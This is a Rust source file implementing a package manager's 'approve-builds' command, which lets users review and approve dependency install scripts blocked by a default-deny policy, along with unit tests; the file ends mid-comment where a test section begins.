//! `lpm approve-builds` — review and approve packages whose install scripts
//! were blocked by the post-Phase-4 default-deny security posture.
//!
//! ## Phase 32 Phase 4 M4
//!
//! This command pairs with the post-install warning emitted by `lpm install`
//! when packages with lifecycle scripts are not yet covered by an existing
//! strict approval. It reads the install-time blocked set from
//! `<project_dir>/.lpm/build-state.json` (written by M3) and lets the user
//! approve them via:
//!
//! - **Interactive TUI** (`lpm approve-builds`) — walk the blocked set one
//!   at a time, with `Approve / Skip / View full script / Quit` per package
//! - **Bulk approve** (`--yes`) — approve everything blocked, with a loud
//!   warning banner; the escape hatch for CI / "I trust this manifest"
//! - **Direct approve** (`<pkg>`) — approve a single package by name
//! - **Read-only listing** (`--list`) — print the blocked set, NO mutations
//!
//! All approvals are bound to `{name, version, integrity, script_hash}`
//! per the Phase 4 trust binding contract (see [`lpm_workspace::TrustedDependencies`]).
//!
//! ## Output
//!
//! In `--json` mode the command emits a stable, versioned schema (see
//! [`SCHEMA_VERSION`]). The same schema is used for `--list --json` and
//! `--yes --json` so agents can drive the flow uniformly.

use crate::build_state::{self, BlockedPackage, BuildState};
use crate::output;
use lpm_common::LpmError;
use lpm_workspace::{TrustMatch, TrustedDependencies};
use owo_colors::OwoColorize;
use std::path::{Path, PathBuf};

/// Stable schema version for the `--json` output. Bump on any breaking
/// change to the JSON shape so agents can branch on it.
pub const SCHEMA_VERSION: u32 = 1;

/// Filter the persisted build-state's blocked set against the current
/// `trustedDependencies` and return only the entries that are STILL
/// blocked.
///
/// **Phase 4 audit fix (D-impl-2, 2026-04-11):** the persisted
/// `build-state.json` is only refreshed by `lpm install`. Without this
/// filter step, `lpm approve-builds` would re-render or re-approve
/// packages the user has already approved (until the next install
/// re-captures the state). The audit reproduced this end-to-end:
/// install esbuild → approve-builds --yes → approve-builds --list --json
/// still returned esbuild as blocked.
///
/// The filter rule mirrors the install-time blocked-set computation in
/// [`build_state::compute_blocked_packages`]:
///
/// - [`TrustMatch::Strict`] / [`TrustMatch::LegacyNameOnly`] → REMOVE
///   from the effective blocked set (the script will run when `lpm build`
///   eventually executes; the user has nothing to review).
/// - [`TrustMatch::BindingDrift`] → KEEP. Drift is the whole reason we
///   re-review. The blocked package's existing `binding_drift` flag is
///   already true in this case (set by the install-time capture), so the
///   downstream rendering doesn't need to know whether the drift came
///   from the persisted state or from a fresh check.
/// - [`TrustMatch::NotTrusted`] → KEEP. The default-deny case.
pub fn compute_effective_blocked_set<'a>(
    state: &'a BuildState,
    trusted: &TrustedDependencies,
) -> Vec<&'a BlockedPackage> {
    state
        .blocked_packages
        .iter()
        .filter(|bp| {
            let trust = trusted.matches_strict(
                &bp.name,
                &bp.version,
                bp.integrity.as_deref(),
                bp.script_hash.as_deref(),
            );
            !matches!(trust, TrustMatch::Strict | TrustMatch::LegacyNameOnly)
        })
        .collect()
}

/// Run the `lpm approve-builds` command.
///
/// `package`: Some(name) or Some("name@version") to approve a specific
/// package directly. None to enter the interactive walk OR (with `--yes`
/// or `--list`) the corresponding non-interactive variant.
///
/// `yes`: bulk-approve every blocked package. Mutually exclusive with `list`.
///
/// `list`: read-only listing of the blocked set. Mutually exclusive with
/// `yes`. Cannot be combined with `package`.
pub async fn run(
    project_dir: &Path,
    package: Option<&str>,
    yes: bool,
    list: bool,
    json_output: bool,
) -> Result<(), LpmError> {
    // ── Argument validation ─────────────────────────────────────────
    //
    // Mutual exclusion: `--yes` and `--list` are contradictory (one mutates,
    // one is read-only). `--list` cannot take a `<pkg>` argument because the
    // listing is over the entire blocked set, not a single package. Both are
    // hard errors with actionable guidance.
    if yes && list {
        return Err(LpmError::Script(
            "`--list` is read-only and conflicts with `--yes`. \
             Pick one: `--list` to inspect, or `--yes` to approve."
                .into(),
        ));
    }
    if list && package.is_some() {
        return Err(LpmError::Script(
            "`--list` cannot take a package name argument. \
             It prints the entire blocked set in read-only mode."
                .into(),
        ));
    }

    // ── Read build-state.json ───────────────────────────────────────

    let pkg_json_path = project_dir.join("package.json");
    if !pkg_json_path.exists() {
        return Err(LpmError::NotFound(
            "lpm approve-builds requires a package.json in the current directory.".into(),
        ));
    }

    let state = match build_state::read_build_state(project_dir) {
        Some(s) => s,
        None => {
            return Err(LpmError::NotFound(
                "no build-state.json found — run `lpm install` first to capture the blocked set"
                    .into(),
            ));
        }
    };

    // ── Load current trustedDependencies (Phase 4 D-impl-2) ─────────
    //
    // Loading the manifest BEFORE the early-return on empty state is the
    // audit fix for Finding 2: the persisted state is filtered through
    // the current trust to compute the *effective* blocked set, so an
    // already-approved package doesn't appear in --list / --yes output.

    let manifest_text = std::fs::read_to_string(&pkg_json_path).map_err(LpmError::Io)?;
    let mut manifest: serde_json::Value =
        serde_json::from_str(&manifest_text).map_err(|e| {
            LpmError::Registry(format!("failed to parse package.json: {e}"))
        })?;

    let mut trusted = extract_trusted_dependencies(&manifest);
    let initial_was_legacy = matches!(trusted, TrustedDependencies::Legacy(_));

    // Re-evaluate the persisted blocked set against the current trust.
    // The borrow returns &BlockedPackage; we materialize the underlying
    // owned values into a Vec<BlockedPackage> so the rest of the function
    // can move/iterate without lifetime gymnastics.
    let effective: Vec<BlockedPackage> = compute_effective_blocked_set(&state, &trusted)
        .into_iter()
        .cloned()
        .collect();

    // Construct an "effective state" view that the rest of the function
    // operates on. The captured fingerprint is unchanged (it's the
    // identity of the persisted state, not of the effective filter).
    let effective_state = BuildState {
        state_version: state.state_version,
        blocked_set_fingerprint: state.blocked_set_fingerprint.clone(),
        captured_at: state.captured_at.clone(),
        blocked_packages: effective,
    };

    // ── <pkg> argument: handled BEFORE the empty-effective short-circuit ──
    //
    // When the user explicitly names a package, we want a targeted
    // message: "already approved" if they named something that's been
    // approved, or "not in blocked set" if they named something unknown.
    // The generic "nothing to approve" success path would be confusing
    // because the user is asking about ONE package.
    //
    // Phase 4 D-impl-2: this branch must run BEFORE the empty-effective
    // check so the user-friendly errors are reachable.
    if let Some(arg) = package {
        // Track outcomes for the summary
        let mut approved: Vec<&BlockedPackage> = Vec::new();
        let skipped: Vec<&BlockedPackage> = Vec::new();

        let target = find_blocked_by_arg(&effective_state.blocked_packages, arg);
        let target = match target {
            Some(t) => t,
            None => {
                // Was the arg in the persisted (unfiltered) state? If so,
                // it must have been filtered out by current trust →
                // already approved.
                if find_blocked_by_arg(&state.blocked_packages, arg).is_some() {
                    return Err(LpmError::Script(format!(
                        "package '{arg}' is already approved (current binding matches). \
                         Run `lpm install` to refresh the blocked set, or pass `--list` to see what's still blocked."
                    )));
                }
                return Err(LpmError::NotFound(format!(
                    "package '{arg}' is not in the blocked set. Run `lpm approve-builds --list` to see what's blocked."
                )));
            }
        };

        // Confirm in TTY mode unless json_output (which always proceeds)
        let confirmed = if json_output || !is_tty() {
            true
        } else {
            print_package_card(target);
            cliclack::confirm(format!(
                "Approve {}@{}?",
                target.name, target.version
            ))
            .interact()
            .map_err(|e| LpmError::Script(format!("prompt failed: {e}")))?
        };

        if confirmed {
            trusted.approve(
                &target.name,
                &target.version,
                target.integrity.clone(),
                target.script_hash.clone(),
            );
            approved.push(target);
            write_back(&pkg_json_path, &mut manifest, &trusted)?;
        } else {
            // skip path: nothing to record besides the count (typed-out
            // here to avoid an unused mut warning if we never push)
            return print_summary(
                &effective_state,
                &approved,
                &[target],
                initial_was_legacy,
                false,
                json_output,
            );
        }

        return print_summary(
            &effective_state,
            &approved,
            &skipped,
            initial_was_legacy,
            false,
            json_output,
        );
    }

    if effective_state.blocked_packages.is_empty() {
        if json_output {
            let body = serde_json::json!({
                "schema_version": SCHEMA_VERSION,
                "command": "approve-builds",
                "blocked_count": 0,
                "approved_count": 0,
                "skipped_count": 0,
                "blocked": [],
                "warnings": [],
                "errors": [],
            });
            println!("{}", serde_json::to_string_pretty(&body).unwrap());
        } else {
            output::success(
                "Nothing to approve. All scriptable packages are already trusted (or there are none).",
            );
        }
        return Ok(());
    }

    // ── --list (read-only) ──────────────────────────────────────────

    if list {
        return print_listing(&effective_state, json_output);
    }

    // Track outcomes for the summary / JSON output
    let mut approved: Vec<&BlockedPackage> = Vec::new();
    let mut skipped: Vec<&BlockedPackage> = Vec::new();

    // ── --yes (bulk approve) ────────────────────────────────────────

    if yes {
        emit_yes_warning_banner(effective_state.blocked_packages.len(), json_output);
        for blocked in &effective_state.blocked_packages {
            trusted.approve(
                &blocked.name,
                &blocked.version,
                blocked.integrity.clone(),
                blocked.script_hash.clone(),
            );
            approved.push(blocked);
        }
        write_back(&pkg_json_path, &mut manifest, &trusted)?;
        return print_summary(
            &effective_state,
            &approved,
            &skipped,
            initial_was_legacy,
            yes,
            json_output,
        );
    }

    // (The `<pkg>` branch is handled at the top of `run` BEFORE the
    // empty-effective short-circuit — see the Phase 4 D-impl-2 comment.)

    // ── Default: interactive walk ───────────────────────────────────

    if !is_tty() {
        return Err(LpmError::Script(
            "interactive review requires a TTY. \
             Use `--yes` to approve everything, `--list` to inspect, or pass a `<pkg>` argument."
                .into(),
        ));
    }
    if json_output {
        return Err(LpmError::Script(
            "interactive review cannot be combined with `--json`. \
             Use `--list --json`, `--yes --json`, or `<pkg> --json` for structured output."
                .into(),
        ));
    }

    // Walk one at a time. Quit aborts WITHOUT writing in-progress entries
    // (atomic). The accumulator only gets flushed to disk after the loop.
    // Phase 4 D-impl-2: walk the EFFECTIVE blocked set, not the persisted
    // state — already-approved packages are skipped.
    output::info(&format!(
        "{} package(s) blocked. Walking one at a time — Quit aborts without writing.",
        effective_state.blocked_packages.len(),
    ));
    println!();

    let mut quit_early = false;
    for blocked in &effective_state.blocked_packages {
        print_package_card(blocked);

        // The View option re-prints the full script and re-prompts. To
        // re-prompt without cloning the (non-Clone) cliclack Select, we
        // build a fresh Select on each iteration.
        let mut decision: Option<bool> = None;
        loop {
            let prompt = format!(
                "What would you like to do with {}@{}?",
                blocked.name, blocked.version
            );
            let choice = cliclack::select(prompt)
                .item(InteractiveChoice::Approve, "Approve", "")
                .item(InteractiveChoice::Skip, "Skip", "")
                .item(InteractiveChoice::View, "View full script", "")
                .item(InteractiveChoice::Quit, "Quit", "abort without writing")
                .initial_value(InteractiveChoice::Approve)
                .interact()
                .map_err(|e| LpmError::Script(format!("prompt failed: {e}")))?;
            match choice {
                InteractiveChoice::Approve => {
                    decision = Some(true);
                    break;
                }
                InteractiveChoice::Skip => {
                    decision = Some(false);
                    break;
                }
                InteractiveChoice::View => {
                    print_full_script(project_dir, blocked);
                    // Loop back: rebuild Select and re-prompt
                    continue;
                }
                InteractiveChoice::Quit => {
                    quit_early = true;
                    break;
                }
            }
        }

        if quit_early {
            break;
        }

        match decision {
            Some(true) => approved.push(blocked),
            Some(false) => skipped.push(blocked),
            None => unreachable!("inner loop only exits with a decision or quit_early"),
        }
        println!();
    }

    if quit_early {
        // Aborted: do NOT write any in-progress entries.
        if approved.is_empty() {
            output::warn("Quit before approving anything. package.json is unchanged.");
        } else {
            output::warn(&format!(
                "Quit after {} approval(s). DISCARDED — package.json is unchanged.",
                approved.len()
            ));
        }
        return Ok(());
    }

    // Apply approvals (atomic single write)
    for blocked in &approved {
        trusted.approve(
            &blocked.name,
            &blocked.version,
            blocked.integrity.clone(),
            blocked.script_hash.clone(),
        );
    }
    if !approved.is_empty() {
        write_back(&pkg_json_path, &mut manifest, &trusted)?;
    }

    print_summary(
        &effective_state,
        &approved,
        &skipped,
        initial_was_legacy,
        false,
        json_output,
    )
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum InteractiveChoice {
    Approve,
    Skip,
    View,
    Quit,
}

/// Find a blocked package matching either `name` or `name@version`.
/// Used by the `<pkg>` argument path.
fn find_blocked_by_arg<'a>(
    blocked: &'a [BlockedPackage],
    arg: &str,
) -> Option<&'a BlockedPackage> {
    // Case 1: name@version (exact match)
    // Case 2: bare name (returns the FIRST entry with that name)
    //
    // For scoped packages like `@scope/pkg@1.0.0`, the LAST `@` is the
    // separator (the leading `@` is part of the scope).
    if let Some(at) = arg.rfind('@') {
        // arg COULD be `name@version` OR a scoped name `@scope/pkg`.
        // Distinguish: if the `@` is at position 0, it's the scope marker.
        if at > 0 {
            let (name, version) = (&arg[..at], &arg[at + 1..]);
            return blocked.iter().find(|b| b.name == name && b.version == version);
        }
    }
    // Bare name lookup
    blocked.iter().find(|b| b.name == arg)
}

/// Extract `lpm.trustedDependencies` from a parsed manifest into a typed
/// [`TrustedDependencies`] enum. Returns the default (empty Legacy) if the
/// field is missing or fails to parse.
fn extract_trusted_dependencies(manifest: &serde_json::Value) -> TrustedDependencies {
    let Some(td_value) = manifest.get("lpm").and_then(|l| l.get("trustedDependencies")) else {
        return TrustedDependencies::default();
    };
    serde_json::from_value(td_value.clone()).unwrap_or_default()
}

/// Write the updated `trustedDependencies` back to `package.json`.
///
/// Atomic via temp-file rename. Preserves the rest of the manifest
/// untouched (we mutate only the `lpm.trustedDependencies` subtree).
fn write_back(
    pkg_json_path: &Path,
    manifest: &mut serde_json::Value,
    trusted: &TrustedDependencies,
) -> Result<(), LpmError> {
    // Ensure `lpm` exists as a JSON object
    if manifest.get("lpm").is_none() {
        manifest["lpm"] = serde_json::json!({});
    }
    if !manifest["lpm"].is_object() {
        return Err(LpmError::Registry(
            "package.json `lpm` field is not a JSON object — refusing to write".into(),
        ));
    }

    let td_value = serde_json::to_value(trusted)
        .map_err(|e| LpmError::Registry(format!("failed to serialize trustedDependencies: {e}")))?;
    manifest["lpm"]["trustedDependencies"] = td_value;

    let updated = serde_json::to_string_pretty(manifest)
        .map_err(|e| LpmError::Registry(format!("failed to serialize package.json: {e}")))?;

    // Atomic write: temp file + rename. Mirrors build_state::write_build_state.
    let parent = pkg_json_path.parent().unwrap_or(Path::new("."));
    let pid = std::process::id();
    let nanos = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_nanos())
        .unwrap_or(0);
    let tmp = parent.join(format!(".package.json.{pid}.{nanos}.tmp"));
    std::fs::write(&tmp, format!("{updated}\n")).map_err(LpmError::Io)?;
    std::fs::rename(&tmp, pkg_json_path).map_err(|e| {
        let _ = std::fs::remove_file(&tmp);
        LpmError::Io(std::io::Error::new(
            e.kind(),
            format!("failed to rename package.json tempfile into place: {e}"),
        ))
    })?;

    Ok(())
}

fn is_tty() -> bool {
    use std::io::IsTerminal;
    std::io::stdin().is_terminal() && std::io::stdout().is_terminal()
}

fn emit_yes_warning_banner(count: usize, json_output: bool) {
    let msg = format!(
        "--yes blanket-approves {count} package(s) without per-package review. \
         Approvals are bound to script hashes captured at install time. \
         This bypasses LPM's default-deny security posture."
    );
    // Triple-emission per Phase 4 status doc §"Security requirements":
    // human stdout (only in non-JSON mode), JSON warning field (set by
    // print_summary), and tracing log so any log aggregator catches the
    // bypass.
    //
    // **Phase 4 audit fix (D-impl-3, 2026-04-11):** the tracing emission
    // is safe in JSON mode because the global tracing subscriber in
    // `main.rs` is pinned to stderr — see the matching audit comment
    // there. Pre-fix the subscriber wrote to stdout and corrupted the
    // JSON payload. The relevant invariant: stdout is reserved for
    // command output (human or JSON); tracing always goes to stderr.
    tracing::warn!("{}", msg);
    if !json_output {
        println!();
        output::warn(&msg);
        println!();
    }
}

fn print_package_card(blocked: &BlockedPackage) {
    println!();
    println!(
        "  {}@{}",
        blocked.name.bold(),
        blocked.version.dimmed(),
    );
    if let Some(integrity) = &blocked.integrity {
        println!(
            "    {:<14}{}",
            "Integrity:".dimmed(),
            truncate_for_display(integrity, 60),
        );
    }
    if let Some(script_hash) = &blocked.script_hash {
        println!(
            "    {:<14}{}",
            "Script hash:".dimmed(),
            truncate_for_display(script_hash, 60),
        );
    }
    if !blocked.phases_present.is_empty() {
        println!(
            "    {:<14}{}",
            "Phases:".dimmed(),
            blocked.phases_present.join(", "),
        );
    }
    if blocked.binding_drift {
        println!(
            "    {} {}",
            "⚠".yellow(),
            "previously approved — script content has changed since approval"
                .yellow()
        );
    }
    println!();
}

fn truncate_for_display(s: &str, max: usize) -> String {
    if s.len() <= max {
        s.to_string()
    } else {
        format!("{}…", &s[..max])
    }
}

/// Read the package's `package.json` from the GLOBAL STORE and print every
/// non-empty install phase body. Used by the "View full script" choice in
/// the interactive walk. Read from the store (not from `node_modules`) to
/// match what the build pipeline executes — same source-of-truth as the
/// script-hash function.
fn print_full_script(_project_dir: &Path, blocked: &BlockedPackage) {
    let store = match lpm_store::PackageStore::default_location() {
        Ok(s) => s,
        Err(e) => {
            output::warn(&format!("could not open store: {e}"));
            return;
        }
    };
    let pkg_dir = store.package_dir(&blocked.name, &blocked.version);
    let pkg_json_path = pkg_dir.join("package.json");
    let content = match std::fs::read_to_string(&pkg_json_path) {
        Ok(c) => c,
        Err(e) => {
            output::warn(&format!(
                "could not read package.json from store at {}: {e}",
                pkg_json_path.display()
            ));
            return;
        }
    };
    let parsed: serde_json::Value = match serde_json::from_str(&content) {
        Ok(v) => v,
        Err(e) => {
            output::warn(&format!("could not parse package.json: {e}"));
            return;
        }
    };
    let scripts = parsed.get("scripts").and_then(|v| v.as_object());

    println!();
    println!("  ── Full install scripts ──");
    for phase in lpm_security::EXECUTED_INSTALL_PHASES {
        let body = scripts
            .and_then(|s| s.get(*phase))
            .and_then(|v| v.as_str())
            .filter(|s| !s.is_empty());
        match body {
            Some(b) => {
                println!("  {}: {}", phase.bold(), b);
            }
            None => {
                println!("  {}: {}", phase.dimmed(), "(none)".dimmed());
            }
        }
    }
    println!();
}

fn print_listing(state: &BuildState, json_output: bool) -> Result<(), LpmError> {
    if json_output {
        let body = serde_json::json!({
            "schema_version": SCHEMA_VERSION,
            "command": "approve-builds",
            "mode": "list",
            "blocked_count": state.blocked_packages.len(),
            "approved_count": 0,
            "skipped_count": 0,
            "blocked": state.blocked_packages.iter().map(blocked_to_json).collect::<Vec<_>>(),
            "warnings": [],
            "errors": [],
        });
        println!("{}", serde_json::to_string_pretty(&body).unwrap());
        return Ok(());
    }

    output::info(&format!(
        "{} package(s) blocked:",
        state.blocked_packages.len()
    ));
    for blocked in &state.blocked_packages {
        print_package_card(blocked);
    }
    println!();
    output::info(
        "Run `lpm approve-builds` (interactive), `lpm approve-builds --yes` (bulk), or `lpm approve-builds <pkg>` to approve.",
    );
    Ok(())
}

fn blocked_to_json(blocked: &BlockedPackage) -> serde_json::Value {
    serde_json::json!({
        "name": blocked.name,
        "version": blocked.version,
        "integrity": blocked.integrity,
        "script_hash": blocked.script_hash,
        "phases_present": blocked.phases_present,
        "binding_drift": blocked.binding_drift,
    })
}

fn print_summary(
    state: &BuildState,
    approved: &[&BlockedPackage],
    skipped: &[&BlockedPackage],
    initial_was_legacy: bool,
    yes_flag: bool,
    json_output: bool,
) -> Result<(), LpmError> {
    if json_output {
        let mut warnings: Vec<serde_json::Value> = Vec::new();
        if yes_flag {
            warnings.push(serde_json::json!({
                "code": "yes_blanket_approve",
                "message": format!(
                    "--yes blanket-approved {} package(s) without per-package review",
                    approved.len()
                ),
            }));
        }
        if initial_was_legacy && !approved.is_empty() {
            warnings.push(serde_json::json!({
                "code": "legacy_upgraded_to_rich",
                "message": "trustedDependencies was upgraded from the legacy array form to the rich map form"
            }));
        }
        let body = serde_json::json!({
            "schema_version": SCHEMA_VERSION,
            "command": "approve-builds",
            "mode": if yes_flag { "yes" } else { "interactive" },
            "blocked_count": state.blocked_packages.len(),
            "approved_count": approved.len(),
            "skipped_count": skipped.len(),
            "approved": approved.iter().map(|b| blocked_to_json(b)).collect::<Vec<_>>(),
            "skipped": skipped.iter().map(|b| blocked_to_json(b)).collect::<Vec<_>>(),
            "warnings": warnings,
            "errors": [],
        });
        println!("{}", serde_json::to_string_pretty(&body).unwrap());
    } else {
        println!();
        if approved.is_empty() && skipped.is_empty() {
            output::info("No changes to package.json.");
        } else {
            output::success(&format!(
                "{} approved, {} skipped.",
                approved.len(),
                skipped.len()
            ));
            if !approved.is_empty() {
                output::info("Run `lpm build` to execute the approved scripts.");
            }
            if initial_was_legacy {
                output::info(
                    "trustedDependencies upgraded from legacy array to rich form (binding metadata).",
                );
            }
        }
    }
    Ok(())
}

#[allow(dead_code)]
fn _build_state_path_for_tests(project_dir: &Path) -> PathBuf {
    build_state::build_state_path(project_dir)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::build_state::{BlockedPackage, BuildState, BUILD_STATE_VERSION};
    use lpm_workspace::TrustedDependencyBinding;
    use std::fs;
    use tempfile::tempdir;

    fn write_manifest(path: &Path, value: &serde_json::Value) {
        fs::write(path, serde_json::to_string_pretty(value).unwrap()).unwrap();
    }

    fn read_manifest(path: &Path) -> serde_json::Value {
        serde_json::from_str(&fs::read_to_string(path).unwrap()).unwrap()
    }

    fn make_blocked(name: &str, version: &str) -> BlockedPackage {
        BlockedPackage {
            name: name.to_string(),
            version: version.to_string(),
            integrity: Some(format!("sha512-{name}-integrity")),
            script_hash: Some(format!("sha256-{name}-hash")),
            phases_present: vec!["postinstall".to_string()],
            binding_drift: false,
        }
    }

    fn write_state(project_dir: &Path, blocked: Vec<BlockedPackage>) {
        let state = BuildState {
            state_version: BUILD_STATE_VERSION,
            blocked_set_fingerprint: "sha256-test".to_string(),
            captured_at: "2026-04-11T00:00:00Z".to_string(),
            blocked_packages: blocked,
        };
        crate::build_state::write_build_state(project_dir, &state).unwrap();
    }

    fn write_default_manifest(dir: &Path) {
        write_manifest(
            &dir.join("package.json"),
            &serde_json::json!({"name": "test", "version": "0.0.0"}),
        );
    }

    // ── Argument validation ─────────────────────────────────────────

    #[tokio::test]
    async fn approve_builds_yes_and_list_together_hard_errors() {
        let dir = tempdir().unwrap();
        write_default_manifest(dir.path());
        write_state(dir.path(), vec![make_blocked("esbuild", "0.25.1")]);
        let err = run(dir.path(), None, true, true, true).await.unwrap_err();
        let msg = err.to_string();
        assert!(msg.contains("--list") && msg.contains("--yes"));
    }

    #[tokio::test]
    async fn approve_builds_list_with_pkg_arg_hard_errors() {
        let dir = tempdir().unwrap();
        write_default_manifest(dir.path());
        write_state(dir.path(), vec![make_blocked("esbuild", "0.25.1")]);
        let err = run(dir.path(), Some("esbuild"), false, true, true)
            .await
            .unwrap_err();
        assert!(err.to_string().contains("--list"));
    }

    #[tokio::test]
    async fn approve_builds_with_no_state_file_errors_with_install_first_message() {
        let dir = tempdir().unwrap();
        write_default_manifest(dir.path());
        // No state file written
        let err = run(dir.path(), None, false, true, true).await.unwrap_err();
        let msg = err.to_string();
        assert!(msg.contains("lpm install"));
    }

    #[tokio::test]
    async fn approve_builds_with_no_package_json_errors() {
        let dir = tempdir().unwrap();
        // No package.json
        let err = run(dir.path(), None, false, true, true).await.unwrap_err();
        let msg = err.to_string();
        assert!(msg.contains("package.json"));
    }

    #[tokio::test]
    async fn approve_builds_with_empty_blocked_set_succeeds_silently() {
        let dir = tempdir().unwrap();
        write_default_manifest(dir.path());
        write_state(dir.path(), vec![]);
        // --list mode with empty blocked set should succeed
        let result = run(dir.path(), None, false, true, true).await;
        assert!(result.is_ok());
    }

    // ── --list mode ─────────────────────────────────────────────────

    #[tokio::test]
    async fn approve_builds_list_does_not_mutate_package_json() {
        let dir = tempdir().unwrap();
        write_default_manifest(dir.path());
        write_state(dir.path(), vec![make_blocked("esbuild", "0.25.1")]);
        let before = fs::read_to_string(dir.path().join("package.json")).unwrap();
        run(dir.path(), None, false, true, true).await.unwrap();
        let after = fs::read_to_string(dir.path().join("package.json")).unwrap();
        assert_eq!(before, after, "--list must NOT mutate package.json");
    }

    // ── --yes (bulk approve) ────────────────────────────────────────

    #[tokio::test]
    async fn approve_builds_yes_approves_everything_and_writes_rich_form() {
        let dir = tempdir().unwrap();
        write_default_manifest(dir.path());
        write_state(
            dir.path(),
            vec![
                make_blocked("esbuild", "0.25.1"),
                make_blocked("sharp", "0.33.0"),
            ],
        );

        run(dir.path(), None, true, false, true).await.unwrap();

        let after = read_manifest(&dir.path().join("package.json"));
        let td = &after["lpm"]["trustedDependencies"];
        assert!(td.is_object(), "must be Rich (object) form, got: {td}");
        let map = td.as_object().unwrap();
        assert!(map.contains_key("esbuild@0.25.1"));
        assert!(map.contains_key("sharp@0.33.0"));
        // Both bindings preserved
        assert_eq!(
            map["esbuild@0.25.1"]["scriptHash"],
            "sha256-esbuild-hash"
        );
        assert_eq!(
            map["esbuild@0.25.1"]["integrity"],
            "sha512-esbuild-integrity"
        );
    }

    #[tokio::test]
    async fn approve_builds_yes_emits_warning_in_json_mode() {
        let dir = tempdir().unwrap();
        write_default_manifest(dir.path());
        write_state(dir.path(), vec![make_blocked("esbuild", "0.25.1")]);
        // Capturing stdout in nextest is tricky; instead just verify the
        // command succeeds and the manifest mutation lands. The warning
        // emission via tracing::warn is exercised by the integration path.
        run(dir.path(), None, true, false, true).await.unwrap();
        let after = read_manifest(&dir.path().join("package.json"));
        assert!(after["lpm"]["trustedDependencies"]["esbuild@0.25.1"].is_object());
    }

    #[tokio::test]
    async fn approve_builds_yes_legacy_array_upgrades_to_rich() {
        let dir = tempdir().unwrap();
        write_manifest(
            &dir.path().join("package.json"),
            &serde_json::json!({
                "name": "test",
                "version": "0.0.0",
                "lpm": {
                    "trustedDependencies": ["sharp"],
                },
            }),
        );
        write_state(dir.path(), vec![make_blocked("esbuild", "0.25.1")]);

        run(dir.path(), None, true, false, true).await.unwrap();

        let after = read_manifest(&dir.path().join("package.json"));
        let td = &after["lpm"]["trustedDependencies"];
        assert!(td.is_object(), "legacy array must be upgraded to Rich");
        let map = td.as_object().unwrap();
        // New approval
        assert!(map.contains_key("esbuild@0.25.1"));
        // Legacy entry preserved as `<name>@*`
        assert!(map.contains_key("sharp@*"));
    }

    #[tokio::test]
    async fn approve_builds_yes_preserves_unrelated_manifest_fields() {
        let dir = tempdir().unwrap();
        write_manifest(
            &dir.path().join("package.json"),
            &serde_json::json!({
                "name": "test",
                "version": "1.2.3",
                "scripts": {"build": "tsc"},
                "dependencies": {"react": "^18.0.0"},
                "lpm": {"linker": "isolated"},
            }),
        );
        write_state(dir.path(), vec![make_blocked("esbuild", "0.25.1")]);

        run(dir.path(), None, true, false, true).await.unwrap();

        let after = read_manifest(&dir.path().join("package.json"));
        assert_eq!(after["name"], "test");
        assert_eq!(after["version"], "1.2.3");
        assert_eq!(after["scripts"]["build"], "tsc");
        assert_eq!(after["dependencies"]["react"], "^18.0.0");
        // Existing lpm fields preserved
        assert_eq!(after["lpm"]["linker"], "isolated");
        // New trustedDependencies added
        assert!(after["lpm"]["trustedDependencies"].is_object());
    }

    // ── <pkg> argument ──────────────────────────────────────────────

    #[tokio::test]
    async fn approve_builds_specific_package_by_name_approves_only_that_one() {
        let dir = tempdir().unwrap();
        write_default_manifest(dir.path());
        write_state(
            dir.path(),
            vec![
                make_blocked("esbuild", "0.25.1"),
                make_blocked("sharp", "0.33.0"),
            ],
        );

        // json_output=true so the confirm prompt is bypassed (auto-approve)
        run(dir.path(), Some("esbuild"), false, false, true)
            .await
            .unwrap();

        let after = read_manifest(&dir.path().join("package.json"));
        let map = after["lpm"]["trustedDependencies"]
            .as_object()
            .expect("must be Rich");
        assert!(
            map.contains_key("esbuild@0.25.1"),
            "esbuild must be approved"
        );
        assert!(
            !map.contains_key("sharp@0.33.0"),
            "sharp must NOT be approved (was not the target)"
        );
    }

    #[tokio::test]
    async fn approve_builds_specific_package_with_at_version_approves_only_that_one() {
        let dir = tempdir().unwrap();
        write_default_manifest(dir.path());
        write_state(dir.path(), vec![make_blocked("esbuild", "0.25.1")]);

        run(dir.path(), Some("esbuild@0.25.1"), false, false, true)
            .await
            .unwrap();

        let after = read_manifest(&dir.path().join("package.json"));
        assert!(after["lpm"]["trustedDependencies"]["esbuild@0.25.1"].is_object());
    }

    #[tokio::test]
    async fn approve_builds_specific_package_not_in_blocked_set_errors() {
        let dir = tempdir().unwrap();
        write_default_manifest(dir.path());
        write_state(dir.path(), vec![make_blocked("esbuild", "0.25.1")]);

        let err = run(dir.path(), Some("not-installed"), false, false, true)
            .await
            .unwrap_err();
        assert!(err.to_string().contains("not in the blocked set"));
    }

    #[tokio::test]
    async fn find_blocked_by_arg_handles_scoped_names_with_at_in_scope() {
        // Sanity check: a scoped name `@scope/pkg` should match the bare-name
        // path, not be misparsed as `name@version` with empty name. The
        // helper checks `at > 0` to avoid the leading-`@` confusion.
        let blocked = vec![
            make_blocked("@scope/pkg", "1.0.0"),
            make_blocked("plain", "2.0.0"),
        ];
        let by_bare_scoped = find_blocked_by_arg(&blocked, "@scope/pkg");
        assert!(by_bare_scoped.is_some());
        assert_eq!(by_bare_scoped.unwrap().name, "@scope/pkg");

        let by_versioned_scoped = find_blocked_by_arg(&blocked, "@scope/pkg@1.0.0");
        assert!(by_versioned_scoped.is_some());

        let by_plain = find_blocked_by_arg(&blocked, "plain");
        assert_eq!(by_plain.unwrap().name, "plain");
    }

    // ── Atomic write semantics ──────────────────────────────────────

    #[tokio::test]
    async fn approve_builds_writes_atomic_via_temp_file_rename() {
        let dir = tempdir().unwrap();
        write_default_manifest(dir.path());
        write_state(dir.path(), vec![make_blocked("esbuild", "0.25.1")]);
        run(dir.path(), None, true, false, true).await.unwrap();

        // After a successful run, the parent directory should NOT contain
        // any leftover `.tmp` artifacts.
        let entries = std::fs::read_dir(dir.path()).unwrap();
        for entry in entries.flatten() {
            let name = entry.file_name();
            let s = name.to_string_lossy();
            assert!(
                !s.ends_with(".tmp") && !s.contains(".package.json."),
                "tempfile leaked: {s}"
            );
        }
    }

    // ── Schema versioning ───────────────────────────────────────────

    #[test]
    fn schema_version_is_at_least_1() {
        const _: () = assert!(SCHEMA_VERSION >= 1);
    }

    // ── Phase 32 Phase 4 M6: end-to-end state-machine tests ─────────
    //
    // These exercise the full install → block → review → approve → build
    // pipeline by composing M3 (build_state capture) with M4 (approve-builds)
